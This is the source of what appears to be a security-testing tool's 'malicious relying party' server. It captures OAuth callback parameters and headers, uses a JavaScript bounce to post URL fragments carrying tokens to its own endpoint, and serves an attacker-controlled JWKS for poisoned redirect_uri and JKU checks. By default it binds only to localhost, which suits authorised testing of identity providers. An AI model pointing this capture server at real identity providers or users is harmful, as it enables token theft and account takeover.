"""The malicious RP / SP HTTPS server.

Starlette app, hosted by uvicorn in an asyncio task so the runner can spin it
up alongside a test run. Binds to 127.0.0.1 / ::1 by default; binding to a
public interface requires the caller to have set allow_public_bind=True.

Routes:
  GET  /cb                 : the evil RP callback. Captures all params + a
                             one-line JS bounce that posts fragment back to /fragment.
  POST /fragment           : receives fragments posted back from the bounce.
  GET  /jwks.json          : serves the attacker-controlled JWKS (set via set_jwks).
  GET  /saml/metadata      : placeholder for M14; returns 503 until then.
  POST /saml/acs           : SAML ACS for the malicious SP (M14; stub now).
  GET  /captures           : returns CapturedRequest list as JSON (for tests/debug).

A check obtains handles via MaliciousRP; it reads captured requests
synchronously after nudging the IdP, and uses the RP's external URL for
building poison redirect_uris / JKU URIs.
"""

from __future__ import annotations

import asyncio
import json
import ssl
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Any

import uvicorn
from starlette.applications import Starlette
from starlette.requests import Request
from starlette.responses import HTMLResponse, JSONResponse, Response
from starlette.routing import Route


@dataclass
class CapturedRequest:
    method: str
    path: str
    query: dict[str, list[str]]
    headers: dict[str, str]
    body: str
    remote: str | None = None


@dataclass
class MaliciousRPState:
    captures: list[CapturedRequest] = field(default_factory=list)
    jwks: dict[str, Any] | None = None


# starlette's request.state is per-request; store server-scoped state on the app.
async def _capture(request: Request) -> Response:
    state: MaliciousRPState = request.app.state.oauthive  # type: ignore[attr-defined]
    body = (await request.body()).decode(errors="replace")
    state.captures.append(
        CapturedRequest(
            method=request.method,
            path=request.url.path,
            query={k: request.query_params.getlist(k) for k in request.query_params},
            headers={k: v for k, v in request.headers.items()},
            body=body,
            remote=request.client.host if request.client else None,
        )
    )
    # The bounce: post any fragment component back as a form so it ends up in
    # /fragment's body.
    html = """<!doctype html>
<script>
(function () {
  var frag = location.hash;
  if (!frag) return;
  var fd = new FormData();
  fd.append("fragment", frag);
  fetch("/fragment", {method: "POST", body: fd, credentials: "same-origin"});
})();
</script>
<title>oauthive malicious-rp capture</title>
<p>Captured. (If you got here on purpose, check /captures.)</p>
"""
    return HTMLResponse(html)


async def _fragment(request: Request) -> Response:
    state: MaliciousRPState = request.app.state.oauthive  # type: ignore[attr-defined]
    form = await request.form()
    fragment = form.get("fragment", "")
    state.captures.append(
        CapturedRequest(
            method="POST",
            path="/fragment",
            query={},
            headers={k: v for k, v in request.headers.items()},
            body=str(fragment),
            remote=request.client.host if request.client else None,
        )
    )
    return JSONResponse({"ok": True})


async def _jwks(request: Request) -> Response:
    state: MaliciousRPState = request.app.state.oauthive  # type: ignore[attr-defined]
    if state.jwks is None:
        return JSONResponse({"keys": []})
    return JSONResponse(state.jwks)


async def _captures_view(request: Request) -> Response:
    state: MaliciousRPState = request.app.state.oauthive  # type: ignore[attr-defined]
    return JSONResponse([asdict(c) for c in state.captures])


async def _saml_metadata(_: Request) -> Response:
    return Response("not yet implemented (M14)", status_code=503)


async def _saml_acs(request: Request) -> Response:
    return await _capture(request)


def build_app() -> Starlette:
    app = Starlette(
        routes=[
            Route("/cb", _capture, methods=["GET", "POST"]),
            Route("/cb-b", _capture, methods=["GET", "POST"]),
            Route("/fragment", _fragment, methods=["POST"]),
            Route("/jwks.json", _jwks, methods=["GET"]),
            Route("/captures", _captures_view, methods=["GET"]),
            Route("/saml/metadata", _saml_metadata, methods=["GET"]),
            Route("/saml/acs", _saml_acs, methods=["POST", "GET"]),
        ]
    )
    app.state.oauthive = MaliciousRPState()  # type: ignore[attr-defined]
    return app


class MaliciousRP:
    """Context manager around a uvicorn.Server running our app.

    Example:
        async with MaliciousRP(cert=..., key=..., host="127.0.0.1", port=8443) as rp:
            rp.set_jwks(my_jwks)
            ... run checks that point at rp.base_url ...
            for cap in rp.captures(): ...
    """

    def __init__(
        self,
        *,
        host: str = "127.0.0.1",
        port: int = 8443,
        cert: Path | None = None,
        key: Path | None = None,
        allow_public_bind: bool = False,
    ):
        if host not in ("127.0.0.1", "::1", "localhost") and not allow_public_bind:
            raise RuntimeError(
                f"refusing to bind malicious_rp on public host {host!r} without "
                "allow_public_bind=True"
            )
        self.host = host
        self.port = port
        self.cert = cert
        self.key = key
        self.app = build_app()
        self._server: uvicorn.Server | None = None
        self._task: asyncio.Task | None = None

    @property
    def base_url(self) -> str:
        scheme = "https" if self.cert else "http"
        return f"{scheme}://{self.host}:{self.port}"

    @property
    def state(self) -> MaliciousRPState:
        return self.app.state.oauthive  # type: ignore[attr-defined]

    def set_jwks(self, jwks: dict[str, Any]) -> None:
        self.state.jwks = jwks

    def captures(self) -> list[CapturedRequest]:
        return list(self.state.captures)

    def clear_captures(self) -> None:
        self.state.captures.clear()

    async def __aenter__(self) -> "MaliciousRP":
        await self.start()
        return self

    async def __aexit__(self, *_exc) -> None:
        await self.stop()

    async def start(self) -> None:
        cfg = uvicorn.Config(
            self.app,
            host=self.host,
            port=self.port,
            log_level="warning",
            ssl_certfile=str(self.cert) if self.cert else None,
            ssl_keyfile=str(self.key) if self.key else None,
            lifespan="off",
        )
        self._server = uvicorn.Server(cfg)
        self._task = asyncio.create_task(self._server.serve())
        # wait until server is serving
        for _ in range(50):
            if self._server.started:
                return
            await asyncio.sleep(0.02)
        raise RuntimeError("MaliciousRP: server did not start within 1s")

    async def stop(self) -> None:
        if self._server is not None:
            self._server.should_exit = True
        if self._task is not None:
            try:
                await asyncio.wait_for(self._task, timeout=5.0)
            except asyncio.TimeoutError:
                self._task.cancel()
